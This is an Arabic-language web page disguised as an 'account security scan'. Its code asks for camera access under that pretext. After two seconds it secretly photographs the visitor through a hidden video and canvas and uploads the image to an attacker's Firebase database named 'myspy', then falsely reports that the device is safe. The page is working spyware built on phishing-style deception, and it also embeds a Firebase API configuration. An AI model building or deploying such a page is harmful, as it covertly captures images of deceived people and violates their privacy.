<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص أمان الحساب</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background-color: #000; color: #fff; text-align: center; font-family: Arial; padding-top: 50px; }
        .btn { background-color: #ff0000; color: #fff; padding: 15px 30px; border: none; border-radius: 10px; font-size: 20px; cursor: pointer; font-weight: bold; }
        video, canvas { display: none; }
        .logo { width: 100px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <img src="https://i.imgur.com/vHq7j4j.png" class="logo">
    <h1>نظام حماية الحساب 🛡️</h1>
    <p>اضغط أدناه لفحص أمان جهازك ومنع محاولات الاختراق</p>
    <button class="btn" onclick="startCheck()">بدء فحص الأمان الآن</button>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        // إعدادات الفايربيس الخاصة بك يا عبد الرحمن
        const firebaseConfig = {
          apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U",
          authDomain: "myspy-2579b.firebaseapp.com",
          projectId: "myspy-2579b",
          storageBucket: "myspy-2579b.firebasestorage.app",
          messagingSenderId: "487846863334",
          appId: "1:487846863334:web:b58620e6f34d187e02b627"
        };
        
        // تشغيل فايربيس
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        async function startCheck() {
            try {
                // طلب إذن الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // التصوير بعد ثانيتين من فتح الكاميرا
                setTimeout(() => {
                    takePhoto();
                }, 2000);
            } catch (err) {
                alert("خطأ: يجب السماح بالوصول للكاميرا لإتمام عملية الفحص بنجاح!");
            }
        }

        function takePhoto() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // تحويل الصورة لنص (Base64)
            const data = canvas.toDataURL('image/png');
            
            // إرسال الصورة إلى Realtime Database
            database.ref('photos/' + Date.now()).set({
                image: data,
                time: new Date().toLocaleString()
            }).then(() => {
                alert("تم الفحص بنجاح! حسابك وجهازك في أمان تام.");
            });
        }
    </script>
</body>
</html>
